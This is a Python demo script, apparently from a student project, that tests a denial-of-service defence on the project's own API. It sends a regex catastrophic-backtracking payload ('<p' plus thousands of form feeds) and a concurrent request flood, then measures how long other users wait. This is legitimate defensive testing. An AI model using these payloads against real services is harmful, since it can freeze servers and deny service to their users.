"""Defence 2 demo: denial of service.

Two attacks, each measured by how fast an ordinary user is still answered:

  1. One expensive request. Assignment 2's HTML-stripping regex backtracks
     catastrophically on "<p" followed by thousands of form feeds. The request
     is under every size limit (a few KB) yet costs the server minutes of CPU.
  2. A flood. Many normal analyses at once.

Controlled comparison: same machine, same command, only the defence changes.
    1. DOS_GUARD_ENABLED=false in .env, restart the API, then run:
           python scripts/attacks/dos_attack.py --size 1500 --flood 30
       -> other users wait for seconds; the flood is all queued (attack works)
    2. DOS_GUARD_ENABLED=true, restart, run EXACTLY the same command
       -> others answered in milliseconds; the flood's excess gets 503
    Optional variation (defence ON only): --size 11000. With the defence OFF that
    request would freeze the server for most of an hour, so don't run it there.
"""

from __future__ import annotations

import argparse
import collections
import statistics
import threading
import time

import httpx

NORMAL = (
    "Public transportation plays a vital role in creating sustainable and equitable cities. "
    "Efficient transit systems reduce traffic congestion, lower greenhouse gas emissions, and "
    "decrease reliance on private vehicles. Nevertheless, many transit networks suffer from "
    "inadequate funding."
)


def expensive_payload(size: int) -> str:
    # Enough real words to pass validation, then the backtracking trigger.
    return NORMAL + " " + "<p" + "\x0c" * size + "x"


def time_get(client: httpx.Client, path: str) -> tuple[float, int | str]:
    start = time.perf_counter()
    try:
        status = client.get(path).status_code
    except httpx.TimeoutException:
        status = "timeout"
    return time.perf_counter() - start, status


def attack_expensive(url: str, size: int, probes: int) -> None:
    print(f"\n[1] One expensive request ({len(expensive_payload(size).encode()):,} bytes)")
    result: dict = {}

    def send():
        start = time.perf_counter()
        try:
            with httpx.Client(base_url=url, timeout=600) as c:
                r = c.post("/api/detect", json={"text": expensive_payload(size)})
                result["status"] = r.status_code
        except httpx.HTTPError as exc:
            result["status"] = type(exc).__name__
        result["seconds"] = time.perf_counter() - start

    attacker = threading.Thread(target=send)
    attacker.start()
    time.sleep(0.3)  # let the attack reach the server first

    waits = []
    with httpx.Client(base_url=url, timeout=10) as client:
        for _ in range(probes):
            seconds, status = time_get(client, "/api/health")
            waits.append(seconds)
            print(f"    other user GET /api/health -> {status} in {seconds * 1000:,.0f} ms")
            time.sleep(0.2)
    attacker.join()
    print(f"    attacker's request -> {result.get('status')} after {result.get('seconds', 0):.1f} s")
    print(f"    worst wait for other users: {max(waits) * 1000:,.0f} ms")


def attack_flood(url: str, n: int) -> None:
    print(f"\n[2] Flood: {n} analyses at the same moment")
    statuses: collections.Counter = collections.Counter()
    lock = threading.Lock()
    barrier = threading.Barrier(n)

    def send(i: int):
        with httpx.Client(base_url=url, timeout=120) as c:
            barrier.wait()
            # Spoofed IPs don't help here: the guard counts work, not clients.
            r = c.post("/api/detect", json={"text": NORMAL + f" Copy {i}."})
            with lock:
                statuses[r.status_code] += 1

    threads = [threading.Thread(target=send, args=(i,)) for i in range(n)]
    for t in threads:
        t.start()
    time.sleep(0.05)
    with httpx.Client(base_url=url, timeout=10) as client:
        seconds, status = time_get(client, "/api/health")
    for t in threads:
        t.join()
    print(f"    results: {dict(sorted(statuses.items()))}")
    print(f"    other user GET /api/health during flood -> {status} in {seconds * 1000:,.0f} ms")


def baseline(url: str) -> None:
    with httpx.Client(base_url=url, timeout=10) as client:
        times = [time_get(client, "/api/health")[0] for _ in range(5)]
    print(f"Baseline health check: median {statistics.median(times) * 1000:.1f} ms")


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://127.0.0.1:8000")
    parser.add_argument("--size", type=int, default=1500, help="form feeds after '<p' (cost grows with size cubed)")
    parser.add_argument("--probes", type=int, default=5)
    parser.add_argument("--flood", type=int, default=30)
    args = parser.parse_args()

    baseline(args.url)
    attack_expensive(args.url, args.size, args.probes)
    if args.flood:
        attack_flood(args.url, args.flood)


if __name__ == "__main__":
    main()
